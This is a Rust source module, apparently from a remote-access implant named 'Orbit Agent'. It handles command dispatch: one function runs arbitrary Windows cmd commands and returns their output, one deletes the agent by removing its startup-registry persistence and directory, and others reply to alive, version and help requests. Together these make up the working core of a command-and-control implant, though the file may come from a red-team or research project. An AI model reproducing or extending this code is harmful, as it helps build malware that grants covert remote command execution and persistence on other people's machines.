use crate::config;
use crate::utils;

use std::io;
use std::process;

// execute a cmd command
pub fn cmd_exec(cmd: &String) -> Result<String, io::Error> {
    // run cmd command
    let command = process::Command::new(config::commands::CLI)
        .args(["/C", cmd])
        .output()?;

    // get command's output as a String
    let output = if command.stdout.len() > 0 {
        command.stdout
    } else {
        command.stderr
    };

    // convert output to a string
    let output = String::from_utf8(output).unwrap_or(String::from(config::commands::OUTPUT_ERR));
    Ok(output)
}

// delete agent
pub fn delete_agent() -> ! {
    // delete agent from sturtup registry
    utils::registry::rm_from_startup();
    // remove new agent dir
    utils::filesystem::rm_desired_dir();
    // exit
    exit();
}

// close agent
pub fn exit() -> ! {
    // exit with success (0) exit code
    process::exit(0);
}

// a simple echo reply
pub fn echo_reply() -> Result<String, io::Error> {
    Ok(String::from("Orbit Agent is alive"))
}

// will return a version string
pub fn version() -> Result<String, io::Error> {
    Ok(format!("Running Orbit Agent - v{}", config::VERSION))
}

pub fn help() -> Result<String, io::Error> {
    Ok(String::from(config::commands::HELP))
}

// that function does nothing
pub fn nothing() -> Result<String, io::Error> {
    Ok(String::new())
}

pub fn unknown_command() -> Result<String, io::Error> {
    Ok(String::from(config::commands::UNKNOWN_COMMAND))
}
